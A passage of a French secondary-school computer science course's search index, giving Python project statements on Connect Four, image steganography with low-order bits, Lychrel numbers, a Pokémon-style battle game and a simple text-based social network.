grille[i+3][j+3] == joueur:\n                return True\n    for i in range(3,len(grille)):\n        for j in range(len(grille[0])-3):\n            if grille[i][j] == joueur and grille[i-1][j+1] == joueur and grille[i-2][j+2] == joueur and grille[i-3][j+3] == joueur:\n                return True\n    return False\n</code></pre>"},{"location":"premiere/XIII-Projets/Mini_Projets/Puissance_4/puissance_4/#44-verifier_victoiregrille-joueur","title":"4.4 <code>verifier_victoire(grille, joueur)</code>","text":"<p>\u00c9crire une fonction <code>verifier_victoire</code> qui combine les v\u00e9rifications pr\u00e9c\u00e9dentes.</p> <p>Exemple d'utilisation : <pre><code>&gt;&gt;&gt; verifier_victoire(grille, 'X')\nFalse\n</code></pre></p>"},{"location":"premiere/XIII-Projets/Mini_Projets/Puissance_4/puissance_4/#5-fonction-principale","title":"5. Fonction principale","text":"<p>\u00c9crire la fonction <code>puissance4</code> qui g\u00e8re le d\u00e9roulement complet du jeu.</p>"},{"location":"premiere/XIII-Projets/Mini_Projets/Puissance_4/puissance_4/#pseudo-code-detaille","title":"Pseudo-code d\u00e9taill\u00e9 :","text":"<pre><code>Fonction puissance4():\n    Initialiser une grille vide\n    joueur_actuel = 'X'\n\n    R\u00e9p\u00e9ter :\n        Afficher la grille\n        Afficher \"Tour du joueur\", joueur_actuel\n\n        Demander la colonne de jeu\n\n        Tant que colonne invalide ou pleine:\n            Afficher message d'erreur\n            Redemander une colonne\n\n        Ajouter le jeton du joueur\n\n        Si victoire:\n            Afficher \"Victoire du joueur\", joueur_actuel\n            Arr\u00eater\n\n        Si match nul (grille pleine):\n            Afficher \"Match nul\"\n            Arr\u00eater\n\n        Changer de joueur\n</code></pre>"},{"location":"premiere/XIII-Projets/Mini_Projets/Steganographie/Sujet/","title":"St\u00e9ganographie : l'art de cacher des messages","text":"<p>Vous \u00eates missionn\u00e9s par le gouvernement pour passer des tests pour devenir membre du service secret. Pour se faire, une des missions qui vous est attribu\u00e9e est de faire passer des messages \u00e0 un destinataire qui n'a pas acc\u00e8s aux ressources des services secrets.</p> <p>Comme votre destinataire n'a pas les machines ou services chiffr\u00e9s et s\u00e9curis\u00e9s de votre services, vous devez r\u00e9aliser ces transferts d'informations par mail interpos\u00e9s.</p> <p>Il n'est pas forc\u00e9ment secret de transferer des informations dans le corps d'un mail, donc on vous propose une id\u00e9e, la st\u00e9ganographie.</p> <p>La st\u00e9ganographie est l'art de dissimuler des messages par diverses techniques dans d'autres contenus. Ici, vous devrez cacher une image dans une autre image.</p>"},{"location":"premiere/XIII-Projets/Mini_Projets/Steganographie/Sujet/#pre-requis","title":"Pr\u00e9-requis","text":"<p>Avant de r\u00e9aliser la st\u00e9ganographie, il faut r\u00e9aliser quelques rappels.</p> <p>Une image est une matrice (un tableau \u00e0 deux dimensions) de pixels. Ces pixels contiennent une information capitale : la valeur de sa couleur, suivant le mode choisi.</p> <p>Pour des questions de simplicit\u00e9, on traitera des images en noir et blanc dans ce projet.</p>"},{"location":"premiere/XIII-Projets/Mini_Projets/Steganographie/Sujet/#binaire","title":"Binaire","text":"<p>On rappelle qu'un pixel contient une valeur mais celle-ci est en binaire et cod\u00e9e sur 1 octet (soient 8 bits). Cela signifie que l'on doit traiter de valeurs binaire et non en base 10.</p> <p>Les 4 bits \u00e0 gauche d'un octet sont appel\u00e9s bits de poids fort tandis que les bits 4 situ\u00e9s \u00e0 droite sont appel\u00e9s bits de poids faible. Par exemple pour l'octet \\(1111 0000_{2}:\\)</p> <p>\\(\\underbrace{1111}_{\\texttt{bits de poids fort}}\\overbrace{0000}^{\\texttt{bits de poids faible}}\\)</p>"},{"location":"premiere/XIII-Projets/Mini_Projets/Steganographie/Sujet/#module-pillow","title":"Module Pillow","text":"<p>Pour le traitement des images, on utilise le module Pillow de Python qui permet de modifier les valeurs de bits, cr\u00e9er de nouvelles images avec des tailles pr\u00e9d\u00e9finies, dans des modes pr\u00e9d\u00e9finis (RGB, Noir et Blanc, Nuances de gris).</p> <p>On peut retrouver un tutoriel dans le cours de seconde.</p>"},{"location":"premiere/XIII-Projets/Mini_Projets/Steganographie/Sujet/#methode-bin-et-int-de-python","title":"M\u00e9thode Bin et Int de Python","text":"<p>La m\u00e9thode <code>bin</code> permet de retourner la repr\u00e9sentation binaire d'un nombre entier sous chaine de caract\u00e8re.</p> <p>Danger</p> <p>La m\u00e9thode bin renverra la repr\u00e9sentation de cette forme \"0b101110\". Il faudra bien retirer \"0b\" pour convertir en base 10 \u00e0 la suite.</p> <p>La m\u00e9thode <code>int</code> permet de convertir une variable en type int. Petite aide pour la suite, on peut convertir une repr\u00e9sentation en base 2 en base 10 avec la sytaxe : </p> <pre><code>    &gt;&gt;&gt;repr_binaire = \"01001110\"\n    &gt;&gt;&gt;print(repr_binaire)\n        \"01001110\"\n    &gt;&gt;&gt;print(int(repr_binaire))\n        01001110\n    &gt;&gt;&gt;print(int(repr_binaire,2))\n        78\n</code></pre>"},{"location":"premiere/XIII-Projets/Mini_Projets/Steganographie/Sujet/#methode","title":"M\u00e9thode","text":"<p>Pour r\u00e9aliser \"cacher\" le message cod\u00e9 dans une image, il faut pouvoir modifier l'image qui servira de contenant sans que cela se remarque. Chaque pixel a une valeur cod\u00e9e sur 8 bits et les bits de poids fort permettent de faire varier la valeur du pixel de 16 \u00e0 255. Cela veut dire que les bits de poids faible n'ont que peu d'impact sur la repr\u00e9sentation de la couleur.</p> <p>La m\u00e9thode \u00e0 employer consistera \u00e0 remplacer les bits de poids faible de la repr\u00e9sentation de chaque pixel par les bits de poids fort de l'image \u00e0 cacher. Cela n'impactera peu la couleur du pixel et permettra de dissimuler le message \u00e0 transmettre.</p> <p>En clair :  </p> <ul> <li>Pixel de l'image de transport : 1100 1100</li> <li>Pixel de l'image \u00e0 cacher : 0110 0010</li> <li>Pixel de l'image finale : 1100 0110</li> </ul> <p>Warning</p> <p>Pour que l'op\u00e9ration fonctionne correctement, il faut utiliser des images de d\u00e9part en format non compress\u00e9. Utiliser des formats compress\u00e9s comme le PNG, le JPEG peut poser des probl\u00e8mes lors de l'op\u00e9ration de chiffrement. On utilisera le format pgm qui est non compress\u00e9.</p>"},{"location":"premiere/XIII-Projets/Mini_Projets/Steganographie/Sujet/#a-realiser","title":"\u00c0 r\u00e9aliser","text":"<p>On doit manipuler la repr\u00e9sentation binaire de nombres.  </p>"},{"location":"premiere/XIII-Projets/Mini_Projets/Steganographie/Sujet/#fonction-de-representation-des-bits-dun-pixel","title":"Fonction de repr\u00e9sentation des bits d'un pixel","text":"<p>Implanter une fonction <code>representation_binaire</code> qui prend en param\u00e8tre un entier et renvoie sa repr\u00e9sentation binaire en chaine de caract\u00e8re.  Cette fonction prendra soin de rajouter des 0 au d\u00e9but de la repr\u00e9sentation si celle-ci n'est pas d\u00e9j\u00e0 sur 8 bits.</p> <p>Tip</p> <ul> <li>Vous pouvez utiliser la m\u00e9thode <code>bin</code> qui donne la repr\u00e9sentation en chaine de caract\u00e8re sous forme \"0babcd\" avec a,b,c et d des bits.  </li> <li>Pour retrancher les deux caract\u00e8res 0b, la syntaxe permet d'avoir une cha\u00eene de caract\u00e8re omettant les 2 premiers caract\u00e8res. <pre><code>    chainte_caract\u00e8re = \"0b1010\"\n    chaine_finale = chaine_caractere[2:]\n    &gt;&gt;&gt;print(chaine_finale)\n    \"1010\"\n</code></pre></li> </ul>"},{"location":"premiere/XIII-Projets/Mini_Projets/Steganographie/Sujet/#chiffrage-dune-image-dans-une-autre","title":"Chiffrage d'une image dans une autre","text":"<p>Compl\u00e9ter la fonction suivante <code>chiffrer_image</code> qui prend en param\u00e8tre 2 images du module PIL et renvoie une nouvelle image qui cache l'une des deux dans l'autre.</p> <pre><code>def chiffrer_image(img1, img2):\n    \"\"\"\n    params : \n    img1 : image du module PIL\n    img2 : image du module PIL\n    returns :\n    image_chiffree : image du module PIL\n\n    Chiffre une image de transport avec une image \u00e0 transmettre de mani\u00e8re cach\u00e9e.\n    \"\"\"\n    largeur, hauteur = img1.size\n    image_chiffree = Image.new(\"L\", (largeur, hauteur))\n    for i in range(...):\n        for j in range(...):\n            pixel_img1 = img1.getpixel((i,j))\n            pixel_img2 = img2.getpixel((i,j))\n            ...\n            ...\n            image_chiffree.putpixel((i,j), ... )\n    return image_chiffree\n</code></pre> <p>Tester avec les deux images ci-dessous (cliquez pour y acc\u00e9der). maya lara</p>"},{"location":"premiere/XIII-Projets/Mini_Projets/Steganographie/Sujet/#dechiffrage-dune-image-chiffree-pour-recuperer-le-message","title":"D\u00e9chiffrage d'une image chiffr\u00e9e pour r\u00e9cup\u00e9rer le message.","text":"<p>Pour d\u00e9chiffrer l'image et r\u00e9cup\u00e9rer le message, il suffit de retrouver les bits de poids faible de l'image chiffr\u00e9e pour composer un octet contenant ces bits de poids faible et 4 z\u00e9ros.</p> <p>Implanter une fonction <code>dechiffre_image</code> qui prend en param\u00e8tre une image <code>img</code> du module PIL et renvoie une image qui affichera celle qui est cach\u00e9e.</p> <p>Vous utiliserez la m\u00eame structure de fonction que pour la fonction <code>chiffrer_image</code>.</p>"},{"location":"premiere/XIII-Projets/Mini_Projets/Steganographie/Sujet/#qui-est-le-coupable","title":"Qui est le coupable?","text":"<p>Vous avez \u00e9t\u00e9 missionn\u00e9 pour chercher qui a vol\u00e9 le stock de croquette du magasin \u00e0 c\u00f4t\u00e9 du lyc\u00e9e.</p> <p>Une image du ou de la coupable est chiffr\u00e9e dans l'image <code>image_chiffree.pgm</code>.</p>"},{"location":"premiere/XIII-Projets/Mini_Projets/nombres_lychrel/sujet/","title":"Nombres de Lychrel","text":""},{"location":"premiere/XIII-Projets/Mini_Projets/nombres_lychrel/sujet/#definition-dun-nombre-de-lychrel","title":"D\u00e9finition d'un nombre de Lychrel","text":"<p>Dans l'univers math\u00e9matique, les nombres ont \u00e9t\u00e9 \u00e9tudi\u00e9s en long, large et travers. On peut, dans ces \u00e9tudes parler des nombres de Lychrel.</p> <p>On peut d\u00e9finir qu'un nombre n'est pas un nombre de Lychrel si, apr\u00e8s un certain nombre d'additions de certains nombres, on ne tombe pas sur un nombre palindrome.</p> <p>Le traitement est le suivant :</p> <ol> <li>On choisit un nombre, par exemple \\(75\\).</li> <li>\u00c0 ce nombre, on ajoute son nombre miroir, ici \\(57\\).</li> <li>On obtient \\(132\\).</li> <li>On r\u00e9alise ce proc\u00e9d\u00e9 jusqu'\u00e0 trouver le palindrome associ\u00e9 : \\(75 \\rightarrow 132 \\rightarrow 363\\).</li> </ol> <p>Un nombre de Lychrel est un nombre auquel on ne peut pas (ou bien que l'on ne sait pas encore) associer un palindrome.</p> <p>Tip</p> <ul> <li>Travail sur les cast : int -&gt; str ou str -&gt; int</li> <li>Inversion de cha\u00eenes de caract\u00e8res</li> <li>Boucles</li> <li>Fonctions</li> </ul>"},{"location":"premiere/XIII-Projets/Mini_Projets/nombres_lychrel/sujet/#projet","title":"Projet","text":"<p>\u00c9crire une fonction <code>palindrome</code> qui prend en param\u00e8tre une cha\u00eene de caract\u00e8re et qui renvoie True si la cha\u00eene est un palindrome, False sinon. On rappelle qu'un palindrome correspond \u00e0 un mot ou une expression qui peut se lire de gauche \u00e0 droite et de droite \u00e0 gauche. Exemple : kayak est un palindrome, \\(404\\) est un palindrome.</p> <p>La premi\u00e8re \u00e9tape pour r\u00e9aliser ce traitement math\u00e9matique est de trouver le nombre miroir correspondant au nombre que l'on doit traiter (et successivement additionner). \u00c9crire une fonction <code>nombre_miroir</code> qui prend en param\u00e8tre un nombre entier et renvoie son nombre miroir. Indication : vous utiliserez une boucle <code>for i in range(...)</code> qui parcourera la cha\u00eene de caract\u00e8re et vous concat\u00e8nerez les diff\u00e9rentes cha\u00eenes de caract\u00e8re. Enfin, il faudra changer la cha\u00eene de caract\u00e8re en nombre entier.</p> <p>\u00c9crire une fonction <code>nombre_miroir_tq</code> qui prend en param\u00e8tre un nombre entier et renvoie son nombre miroir. Cette fonction devra \u00eatre impl\u00e9ment\u00e9e en employant une boucle <code>while</code> (tant que).</p> <p>Le probl\u00e8me d'avoir deux fonctions qui r\u00e9alisent la m\u00eame chose mais avec des op\u00e9rations diff\u00e9rentes est que celles-ci peuvent ne pas donner le r\u00e9sultat.</p> <p>On doit se munir d'une fonction de v\u00e9rification pour savoir si les deux fonctionnent de la m\u00eame mani\u00e8re.</p> <p>\u00c9crire une fonction <code>verification_nombre_miroir</code> qui prendra en param\u00e8tre un nombre entier et renvoie True si les fonctions <code>nombre_miroir</code> et <code>nombre_miroir_tq</code>.</p> <p>Vous ne choisirez qu'une seule des deux fonctions pour la fonction finale.</p> <p>Nous avons une fonction qui teste si une cha\u00eene de caract\u00e8re est un palindrome et une autre qui permet de trouver le nombre miroir \u00e0 un nombre pass\u00e9 en param\u00e8tre. On peut donc cr\u00e9er notre fonction d\u00e9tectrice de nombres de Lychrel.</p> <p>\u00c9crire une fonction <code>nombreLychrel</code> qui prend en param\u00e8tre un nombre entier et qui renvoie :</p> \\[ \\begin{equation*}   {nombreLychrel}=      \\begin{cases}         \\text{un nombre entier}&amp; \\text{si } \\text{avant 300 it\u00e9rations un palindrome est trouv\u00e9} \\\\         None &amp; \\text{si aucun palindrome n'est trouv\u00e9 apr\u00e8s 300 it\u00e9rations}       \\end{cases} \\end{equation*} \\] <p>Voici le pseudo-code associ\u00e9 \u00e0 la fonction :</p> <pre><code>    fonction nombreLychrel(nb)\n        si nb est un palindrome :\n            Renvoyer nb\n        sinon :\n            i &lt;- 0\n            tant que nb n'est pas un palindrome\n                nb_miroir &lt;- nombre_miroir(nb)\n                nb &lt;- nb + nb_miroir\n                si nb est un palindrome:\n                    Renvoyer nb\n                i &lt;- i + 1\n                si i &gt; 300:\n                    Renvoyer None\n</code></pre>"},{"location":"premiere/XIII-Projets/PokeNSI/sujet/","title":"Projet - Pok\u00e9NSI (Partie 1) \ud83c\udfae","text":"<p>Le but de ce projet est de cr\u00e9er un jeu inspir\u00e9 de Pok\u00e9mon en utilisant Python. Dans cette premi\u00e8re partie, nous allons nous concentrer sur la cr\u00e9ation du Pok\u00e9dex et la mise en place du syst\u00e8me de combat.</p>"},{"location":"premiere/XIII-Projets/PokeNSI/sujet/#le-pokedex","title":"Le Pok\u00e9dex \ud83d\udcf1","text":"<p>Le Pok\u00e9dex est une base de donn\u00e9es qui contient tous les Pok\u00e9mon du jeu. Chaque Pok\u00e9mon poss\u00e8de les caract\u00e9ristiques suivantes :</p> <ul> <li>nom (cha\u00eene de caract\u00e8res) \ud83d\udcdd  </li> <li>hp (points de vie) \u2764\ufe0f  </li> <li>atq (points d'attaque) \u2694\ufe0f  </li> <li>def (points de d\u00e9fense) \ud83d\udee1\ufe0f  </li> <li>attaques (liste des attaques disponibles) \ud83d\udca5  </li> <li>evolution (nom du Pok\u00e9mon \u00e9volu\u00e9) \u2728  </li> <li>niveau_evolution (niveau requis pour \u00e9voluer) \ud83d\udcc8  </li> <li>niveau (niveau actuel du Pok\u00e9mon) \ud83d\udcca  </li> <li>xp (points d'exp\u00e9rience) \u2b50  </li> </ul>"},{"location":"premiere/XIII-Projets/PokeNSI/sujet/#creation-du-pokedex","title":"Cr\u00e9ation du Pok\u00e9dex \ud83d\udee0\ufe0f","text":"<p>Cr\u00e9ation du Pok\u00e9dex</p> <p>Cr\u00e9er une liste vide <code>pokedex</code> qui contiendra tous les Pok\u00e9mon du jeu.</p> <p>Remplissage du Pok\u00e9dex</p> <p>On dispose de la fonction <code>remplir_pokedex</code> suivante. Elle permet de r\u00e9cup\u00e9rer toutes les informations des pokemons pour en faire une liste de dictionnaires.</p> <pre><code>    def remplir_pokedex(filename:str)-&gt;list:\n        pokedex = []\n        with open(filename,'r') as f:\n            reader = csv.DictReader(f)\n            for row in reader:\n                if row[\"nom\"] != '' or pokemon_dans_pokedex(row[\"nom\"]) == None:\n                    pokedex.append({\"nom\":row[\"nom\"],\"hp\":int(row[\"hp\"]),\n                                    \"atq\":int(row[\"atq\"]),\"def\":int(row[\"def\"]),\"attaques\":row[\"attaques\"].split(\";\"),\n                                    \"evolution\":row[\"evolution\"],\"niveau_evolution\":int(row[\"niveau_evolution\"]),\"niveau\":int(row[\"niveau\"]), \"xp\":int(row[\"xp\"])})\n        return pokedex\n</code></pre> <p>Vous utiliserez le fichier csv suivant : pokedex.csv. Vous retrouverez comment importer un fichier <code>csv</code> dans le cours suivant : cours sur le CSV</p> <p>Cr\u00e9er un Pokemon \ud83d\udd0d</p> <p>Cr\u00e9er la fonction <code>creer_pokemon</code> qui prend en param\u00e8tre un nom de Pok\u00e9mon (str) et renvoie le dictionnaire correspondant au Pok\u00e9mon s'il existe dans le pok\u00e9dex, None sinon.</p> <p>Test du Pok\u00e9dex \u2705</p> <p>Tester vos fonctions de cr\u00e9ation du Pok\u00e9dex : 1. Cr\u00e9er le Pok\u00e9dex vide 2. Remplir le Pok\u00e9dex avec le fichier CSV fourni 3. Afficher tous les Pok\u00e9mon du Pok\u00e9dex pour v\u00e9rifier leur importation 4. Tester la fonction <code>pokemon_dans_pokedex</code> avec \"Pikachu\" puis avec \"Mewtwo\"  </p>"},{"location":"premiere/XIII-Projets/PokeNSI/sujet/#le-systeme-de-combat","title":"Le syst\u00e8me de combat \u2694\ufe0f","text":""},{"location":"premiere/XIII-Projets/PokeNSI/sujet/#les-attaques","title":"Les attaques \ud83d\udca5","text":"<p>Dictionnaire d'attaques</p> <p>L'ensemble des attaques des pokemons est disponible dans le fichier CSV suivant Attaques des pokemons. Le bloc de code suivant permet de cr\u00e9er le dictionnaire des attaques \u00e0 l'instar des pokemon ci dessus:</p> <pre><code>    def encyclopedies_attaques():\n        with open(\"attaques.csv\",'r') as f:\n            attaques = []\n            reader = csv.DictReader(f)\n            for row in reader:\n                attaques.append({row[\"nom_attaque\"]:int(row[\"degats\"])})\n        return attaques\n</code></pre>"},{"location":"premiere/XIII-Projets/PokeNSI/sujet/#gestion-des-degats","title":"Gestion des d\u00e9g\u00e2ts \ud83d\udca2","text":"<p>Lors d'un combat, un pokemon doit en attaquer un autre avec une attaque. Cette attaque retire des points de vie au pokemon et les d\u00e9gats sont calcul\u00e9s suivant la formule ci-apr\u00e8s :  </p> \\[\\texttt{d\u00e9gats}=\\frac{(((N*0.4)+2)*\\texttt{Atq}*\\texttt{Deg})}{\\texttt{Def}*50}+2\\] <p>Avec :</p> <ul> <li>N : Niveau du Pok\u00e9mon attaquant \ud83d\udcca  </li> <li>Atq : L'attaque du pokemon attaquant \u2694\ufe0f  </li> <li>Deg : Les d\u00e9gats de base de l'attaque re\u00e7ue \ud83d\udca5  </li> <li>Def : La d\u00e9fense du pok\u00e9mon d\u00e9fenseur \ud83d\udee1\ufe0f  </li> </ul> <p>Gestion des points de vie  \u2764\ufe0f</p> <p>Cr\u00e9er la fonction <code>retirer_hp</code> qui prend en param\u00e8tre un Pok\u00e9mon et un malus, et retire ces points de vie au Pok\u00e9mon si les d\u00e9gats est positif, c'est-\u00e0-dire si le pokemon defenseur r\u00e9ussit \u00e0 <code>tanker</code> les d\u00e9gats.</p> <p>Syst\u00e8me d'attaque \u2694\ufe0f</p> <p>Cr\u00e9er la fonction <code>attaquer</code> qui prend en param\u00e8tre un Pok\u00e9mon attaquant, un Pok\u00e9mon d\u00e9fenseur et une attaque. Cette fonction doit : 1. R\u00e9cup\u00e9rer les d\u00e9g\u00e2ts de base de l'attaque 2. Calculer les d\u00e9g\u00e2ts finaux selon la formule pr\u00e9c\u00e9dente 3. Retirer les points de vie au d\u00e9fenseur  </p> <p>Test d'une attaque \u26a1</p> <ol> <li>Cr\u00e9er un Pikachu niveau 1.  </li> <li>Cr\u00e9er un Bulbizarre niveau 1.  </li> <li>Faire attaquer le Bulbizarre par le Pikachu gr\u00e2ce \u00e0 son attaque <code>Tonnerre</code>.  </li> <li>Afficher les point de vie du Bulbizarre pour v\u00e9rifier le bon fonctionnement.  </li> </ol>"},{"location":"premiere/XIII-Projets/PokeNSI/sujet/#interface-de-combat","title":"Interface de combat \ud83c\udfae","text":"<p>Affichage des attaques \ud83d\udcdd</p> <p>Cr\u00e9er la fonction <code>afficher_attaques</code> qui prend en param\u00e8tre un Pok\u00e9mon et affiche la liste num\u00e9rot\u00e9e de ses attaques disponibles.</p> <p>Choix d'attaque \ud83c\udfaf</p> <p>Cr\u00e9er la fonction <code>choisir_attaque</code> qui prend en param\u00e8tre un Pok\u00e9mon et un type de joueur (\"Joueur\" ou \"Ordi\") et renvoie l'attaque choisie.</p> <ul> <li>Pour le joueur humain : afficher les attaques et demander un choix (1,2,3 ou 4) suivant le nombre d'attaques disponibles  </li> <li>Pour l'ordinateur : choisir une attaque al\u00e9atoirement  </li> </ul>"},{"location":"premiere/XIII-Projets/PokeNSI/sujet/#systeme-dexperience","title":"Syst\u00e8me d'exp\u00e9rience \ud83d\udcc8","text":"<p>Augmentation des statistiques \ud83d\udcaa</p> <p>Cr\u00e9er la fonction <code>augmenter_stats</code> qui prend en param\u00e8tre un Pok\u00e9mon et augmente ses statistiques selon les formules : - <code>hp = hp + (1/50 * hp * niveau)</code> - <code>atq = atq + (1/50 * atq * niveau)</code> - <code>def = def + (1/50 * def * niveau)</code> </p> <p>Syst\u00e8me d'\u00e9volution \u2728</p> <p>Cr\u00e9er la fonction <code>evolution</code> qui prend en param\u00e8tre un Pokemon et le fait \u00e9voluer si son niveau actuel est sup\u00e9rieur au niveau requis pour \u00e9voluer. Cette fonction demande \u00e0 l'utilisateur s'il veut faire \u00e9voluer son pokemon via un choix (<code>input</code>).</p> <ul> <li>Si le joueur indique <code>Oui</code>, alors cette fonction devra modifier le nom, l'attaque, la d\u00e9fense, le niveau pour sa prochaine \u00e9volution et le nom de son \u00e9volution  </li> <li>Si le joueur indique <code>Non</code>, alors il ne se passe rien  </li> </ul> <p>Evoluer un pokemon \ud83e\udd14</p> <p>Il existe de nombreuses raisons de ne pas faire \u00e9voluer un pokemon. Certains apprennent des attaques plus rapidement que leur version \u00e9volu\u00e9e. D'autres comme Ningale, s'il atteint le 20, il \u00e9voluera en Munja mais si le joueur a un slot de libre dans son \u00e9quipe, il obtiendra en plus le pokemon Munjask.</p> <p>Un pokemon peut monter de niveau si et seulement si : \\(\\texttt{Experience} = 0.8*(\\texttt{Niveau} +5)^3\\)</p> <p>Gestion des niveaux \ud83d\udcca</p> <p>Cr\u00e9er la fonction <code>niveau_superieur</code> qui prend en param\u00e8tre un Pokemon et augmente son niveau. Cette fonction a un r\u00f4le clef dans l'\u00e9volution du jeu car elle permet de faire monter les niveaux d'un pokemon, de modifier ses stats comme il monte de niveau et de le faire \u00e9voluer. Cette fonction devra utiliser les 2 pr\u00e9c\u00e9dentes :</p> <ul> <li>Si le pokemon peut \u00e9voluer, alors on propose au joueur de le faire \u00e9voluer avec la fonction <code>evolution</code></li> <li>Augmente les stats du pokemon avec la fonction <code>augmenter_stats</code></li> </ul> <p>Test du syst\u00e8me d'exp\u00e9rience \ud83c\udf1f</p> <p>Tester le gain d'exp\u00e9rience et la mont\u00e9e de niveau : 1. Cr\u00e9er un Pikachu niveau 1. 2. Attribuer 300 xp au Pikachu. 3. Utiliser la fonction <code>niveau_superieur</code> et v\u00e9rifier qu'il passe bien niveau 2. 4. Mettre Pikachu niveau 25. 5. Utiliser la fonction <code>evolution</code> et v\u00e9rifier, en indiquant le bon choix, qu'il devient bien un Raichu et que ses stats sont bien actualis\u00e9es en fonction de son niveau.</p>"},{"location":"premiere/XIII-Projets/PokeNSI/sujet/#combat-complet","title":"Combat complet \ud83c\udfc6","text":"<p>Syst\u00e8me de combat contre un Pok\u00e9mon sauvage \ud83c\udd9a</p> <p>Cr\u00e9er la fonction <code>combat_pokemon_sauvage</code> qui prend en param\u00e8tre une \u00e9quipe de Pok\u00e9mon et un Pok\u00e9mon sauvage.</p> <p>La fonction doit g\u00e9rer un combat complet selon les \u00e9tapes suivantes:</p> <ol> <li> <p>Initialisation \ud83c\udfac</p> <ul> <li>S\u00e9lectionner le premier Pok\u00e9mon de l'\u00e9quipe</li> <li>Sauvegarder les HP initiaux du Pok\u00e9mon sauvage</li> </ul> </li> <li> <p>Boucle de combat \u2694\ufe0f</p> <ul> <li>Afficher l'\u00e9tat du combat (HP des deux Pok\u00e9mon)</li> <li>Tour du joueur:<ul> <li>Choisir une attaque</li> <li>Appliquer les d\u00e9g\u00e2ts au Pok\u00e9mon sauvage</li> <li>V\u00e9rifier si le Pok\u00e9mon sauvage est K.O.</li> </ul> </li> <li>Tour du Pok\u00e9mon sauvage:<ul> <li>Choisir une attaque al\u00e9atoire</li> <li>Appliquer les d\u00e9g\u00e2ts au Pok\u00e9mon du joueur</li> <li>V\u00e9rifier si le Pok\u00e9mon du joueur est K.O.</li> </ul> </li> </ul> </li> <li> <p>Gestion des K.O. \ud83d\udcab</p> <ul> <li>Si le Pok\u00e9mon sauvage est K.O.:<ul> <li>Attribuer l'exp\u00e9rience au Pok\u00e9mon vainqueur</li> <li>V\u00e9rifier la mont\u00e9e de niveau</li> <li>Terminer le combat (Victoire)</li> </ul> </li> <li>Si le Pok\u00e9mon du joueur est K.O.:<ul> <li>Passer au Pok\u00e9mon suivant dans l'\u00e9quipe</li> <li>Si plus de Pok\u00e9mon disponible, terminer le combat (D\u00e9faite)</li> <li>Sinon, continuer le combat avec le nouveau Pok\u00e9mon</li> </ul> </li> </ul> </li> </ol> <p>La fonction doit renvoyer: - <code>True</code> si le joueur gagne \ud83c\udfc6 - <code>False</code> si tous les Pok\u00e9mon de l'\u00e9quipe sont K.O. \ud83d\udc94</p> <p>Test d'un combat contre un Pok\u00e9mon sauvage \ud83c\udfaf</p> <p>R\u00e9aliser un combat entre votre \u00e9quipe et un Pok\u00e9mon sauvage: 1. Cr\u00e9er une \u00e9quipe avec au moins 2 Pok\u00e9mon (par exemple: Pikachu niveau 5 et Bulbizarre niveau 5) 2. Cr\u00e9er un Pok\u00e9mon sauvage (par exemple: Salam\u00e8che niveau 5) 3. Lancer le combat et observer:     - L'affichage des \u00e9tats de combat     - Le syst\u00e8me de changement de Pok\u00e9mon en cas de K.O.     - Le gain d'exp\u00e9rience en cas de victoire</p>"},{"location":"premiere/XIII-Projets/Reseau_Social_Simplifie/sujet/","title":"Projet - R\u00e9seau Social Simplifi\u00e9 \ud83d\udc65","text":"<p>Ce projet vise \u00e0 simuler les fonctionnalit\u00e9s de base d'un r\u00e9seau social en mode texte. Les utilisateurs pourront cr\u00e9er des comptes, se connecter, publier des messages, voir les messages de leurs amis, et g\u00e9rer leurs amiti\u00e9s.</p>"},{"location":"premiere/XIII-Projets/Reseau_Social_Simplifie/sujet/#concepts-abordes","title":"Concepts Abord\u00e9s","text":"<ul> <li>Structures de donn\u00e9es : dictionnaires (pour les profils utilisateurs, les messages), listes (pour les listes d'amis, les fils d'actualit\u00e9).</li> <li>Gestion de \"bases de donn\u00e9es\" simples (par exemple, une liste de dictionnaires pour les utilisateurs, une autre pour les messages).</li> <li>Fonctions pour encapsuler les diff\u00e9rentes actions.</li> <li>Logique de session utilisateur (utilisateur connect\u00e9).</li> <li>Manipulation de dates et heures (pour horodater les messages).</li> </ul>"},{"location":"premiere/XIII-Projets/Reseau_Social_Simplifie/sujet/#fonctionnalites-a-implementer","title":"Fonctionnalit\u00e9s \u00e0 Impl\u00e9menter","text":""},{"location":"premiere/XIII-Projets/Reseau_Social_Simplifie/sujet/#1-gestion-des-utilisateurs","title":"1. Gestion des Utilisateurs","text":"<p>Chaque utilisateur aura un profil.</p> <p>Structure d'un profil utilisateur \ud83e\uddd1\u200d\ud83d\udcbb</p> <p>D\u00e9finir la structure de donn\u00e9es pour repr\u00e9senter un profil utilisateur. Chaque profil doit contenir au moins : - <code>nom_utilisateur</code> (cha\u00eene de caract\u00e8res, unique) - <code>mot_de_passe</code> (cha\u00eene de caract\u00e8res - pour la simplicit\u00e9, nous ne nous pr\u00e9occuperons pas du hachage s\u00e9curis\u00e9 dans ce projet de base) - <code>amis</code> (une liste de <code>nom_utilisateur</code>) - <code>messages_publies</code> (une liste d'identifiants de messages, ou les messages eux-m\u00eames)</p> <p>Base de donn\u00e9es des utilisateurs</p> <p>Cr\u00e9ez une liste globale (ou une structure de donn\u00e9es \u00e9quivalente) nomm\u00e9e <code>utilisateurs_db</code> pour stocker tous les profils utilisateurs.</p> <p>Cr\u00e9ation de compte et Connexion \ud83d\udd11</p> <p>**Cr\u00e9er les fonctions suivantes : 1. V\u00e9rifie si <code>nom_utilisateur</code> existe d\u00e9j\u00e0 dans <code>utilisateurs_db</code>. 2. Si non, cr\u00e9e un nouveau profil utilisateur (avec une liste d'amis et de messages vide) et l'ajoute \u00e0 <code>utilisateurs_db</code>. 3. Renvoie <code>True</code> si le compte est cr\u00e9\u00e9, <code>False</code> sinon (nom d'utilisateur d\u00e9j\u00e0 pris).</p> <p>Connexion</p> <p>Cr\u00e9ez une fonction <code>se_connecter(utilisateurs_db, nom_utilisateur, mot_de_passe)</code> qui : 1. Recherche l'utilisateur dans <code>utilisateurs_db</code>. 2. V\u00e9rifie si le <code>mot_de_passe</code> fourni correspond. 3. Renvoie le dictionnaire du profil utilisateur si la connexion r\u00e9ussit, <code>None</code> sinon. G\u00e9rez une variable globale <code>utilisateur_connecte</code> qui stockera le profil de l'utilisateur actuellement connect\u00e9 (ou <code>None</code> si personne n'est connect\u00e9).</p> <p>Test de la gestion des utilisateurs \u2705</p> <p>**Tester les fonctions : 2. Cr\u00e9ez plusieurs comptes utilisateurs. Essayez de cr\u00e9er un compte avec un nom d'utilisateur existant. 3. Tentez de vous connecter avec des identifiants corrects et incorrects. 4. V\u00e9rifiez l'\u00e9tat de <code>utilisateur_connecte</code> apr\u00e8s une connexion r\u00e9ussie et une d\u00e9connexion (implicite ou explicite si vous ajoutez une fonction de 